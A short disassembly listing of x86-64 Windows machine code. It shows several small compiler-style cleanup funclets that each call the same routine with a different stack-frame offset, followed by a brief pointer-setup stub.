   14000d686:	48 8b ea             	mov    %rdx,%rbp
   14000d689:	48 8d 8d e0 00 00 00 	lea    0xe0(%rbp),%rcx
   14000d690:	e8 7b 3b ff ff       	call   0x140001210
   14000d695:	48 83 c4 20          	add    $0x20,%rsp
   14000d699:	5d                   	pop    %rbp
   14000d69a:	c3                   	ret
   14000d69b:	cc                   	int3
   14000d69c:	cc                   	int3
   14000d69d:	cc                   	int3
   14000d69e:	cc                   	int3
   14000d69f:	cc                   	int3
   14000d6a0:	40 55                	rex push %rbp
   14000d6a2:	48 83 ec 20          	sub    $0x20,%rsp
   14000d6a6:	48 8b ea             	mov    %rdx,%rbp
   14000d6a9:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   14000d6b0:	e8 5b 3b ff ff       	call   0x140001210
   14000d6b5:	48 83 c4 20          	add    $0x20,%rsp
   14000d6b9:	5d                   	pop    %rbp
   14000d6ba:	c3                   	ret
   14000d6bb:	cc                   	int3
   14000d6bc:	cc                   	int3
   14000d6bd:	cc                   	int3
   14000d6be:	cc                   	int3
   14000d6bf:	cc                   	int3
   14000d6c0:	40 55                	rex push %rbp
   14000d6c2:	48 83 ec 20          	sub    $0x20,%rsp
   14000d6c6:	48 8b ea             	mov    %rdx,%rbp
   14000d6c9:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   14000d6d0:	e8 3b 3b ff ff       	call   0x140001210
   14000d6d5:	48 83 c4 20          	add    $0x20,%rsp
   14000d6d9:	5d                   	pop    %rbp
   14000d6da:	c3                   	ret
   14000d6db:	cc                   	int3
   14000d6dc:	cc                   	int3
   14000d6dd:	cc                   	int3
   14000d6de:	cc                   	int3
   14000d6df:	cc                   	int3
   14000d6e0:	40 55                	rex push %rbp
   14000d6e2:	48 83 ec 20          	sub    $0x20,%rsp
   14000d6e6:	48 8b ea             	mov    %rdx,%rbp
   14000d6e9:	48 8d 8d d0 01 00 00 	lea    0x1d0(%rbp),%rcx
   14000d6f0:	e8 1b 3b ff ff       	call   0x140001210
   14000d6f5:	48 83 c4 20          	add    $0x20,%rsp
   14000d6f9:	5d                   	pop    %rbp
   14000d6fa:	c3                   	ret
   14000d6fb:	cc                   	int3
   14000d6fc:	48 8d 05 65 0c 00 00 	lea    0xc65(%rip),%rax        # 0x14000e368
   14000d703:	48 8d 0d 96 6e 00 00 	lea    0x6e96(%rip),%rcx        # 0x1400145a0
   14000d70a:	48 89 05 8f 6e 00 00 	mov    %rax,0x6e8f(%rip)        # 0x1400145a0
   14000d711:	e9 72 44 ff ff       	jmp    0x140001b88
